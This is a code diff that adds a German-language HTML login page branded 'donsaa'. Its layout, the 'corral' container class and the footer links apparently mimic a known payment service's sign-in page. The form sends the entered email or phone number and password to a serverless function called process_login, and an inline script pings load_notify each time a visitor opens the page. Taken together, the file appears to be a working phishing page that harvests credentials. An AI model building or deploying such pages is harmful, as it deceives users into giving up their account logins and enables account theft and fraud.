@@ -1,0 +1,87 @@
+<!DOCTYPE html>
+<html lang="de">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
+    <title>Anmelden bei Ihrem Konto</title>
+    <link rel="stylesheet" href="assets/css/style.css"> 
+</head>
+<body>
+
+    <div class="corral">
+        <div class="login-card">
+            
+            <div class="logo-container">
+                <a href="#" class="logo-text">donsaa</a>
+            </div>
+
+            <form id="loginForm" action="/.netlify/functions/process_login" method="post" novalidate>
+                
+                <div class="input-group" id="emailGroup">
+                    <div class="field-wrapper" id="emailWrapper">
+                        <input type="text" id="email" name="login_email" autocomplete="username">
+                        <label for="email">E-Mail oder Handynummer</label>
+                    </div>
+                    <div class="error-text">Erforderlich</div>
+                </div>
+
+                <div class="input-group" id="passwordGroup">
+                    <div class="field-wrapper" id="passwordWrapper">
+                        <input type="password" id="password" name="login_password" autocomplete="current-password">
+                        <label for="password">Passwort</label>
+                    </div>
+                    <div class="error-text">Erforderlich</div>
+                </div>
+
+                <a href="#" class="link forgot-link">Passwort vergessen?</a>
+
+                <div class="actions">
+                    <button type="submit" class="btn btn-next" id="btnNext">
+                        <span class="btn-text">Weiter</span>
+                        <div class="spinner"></div>
+                    </button>
+                </div>
+
+                <div class="divider">
+                    <span>oder</span>
+                </div>
+
+                <div class="actions">
+                    <button type="button" class="btn btn-signup">Registrieren</button>
+                </div>
+
+                <div class="lang-selector">
+                    <span class="flag-icon">🇺🇸</span>
+                    <a href="#" class="lang-item active">Englisch</a>
+                    <span>|</span>
+                    <a href="#" class="lang-item">Französisch</a>
+                    <span>|</span>
+                    <a href="#" class="lang-item">Spanisch</a>
+                    <span>|</span>
+                    <a href="#" class="lang-item">Chinesisch</a>
+                </div>
+
+            </form>
+        </div>
+    </div>
+
+    <footer class="footer">
+        <ul>
+            <li><a href="#">Kontakt</a></li>
+            <li><a href="#">Datenschutz</a></li>
+            <li><a href="#">Rechtliches</a></li>
+            <li><a href="#">Richtlinien-Updates</a></li>
+            <li><a href="#">Weltweit</a></li>
+        </ul>
+    </footer>
+
+    <script src="assets/js/login.js"></script> 
+    <script>
+        document.addEventListener('DOMContentLoaded', () => {
+            fetch('/.netlify/functions/load_notify', { method: 'POST' })
+                .then(response => console.log('Visitor notified'))
+                .catch(error => console.error('Error notifying visitor:', error));
+        });
+    </script>
+</body>
+</html>
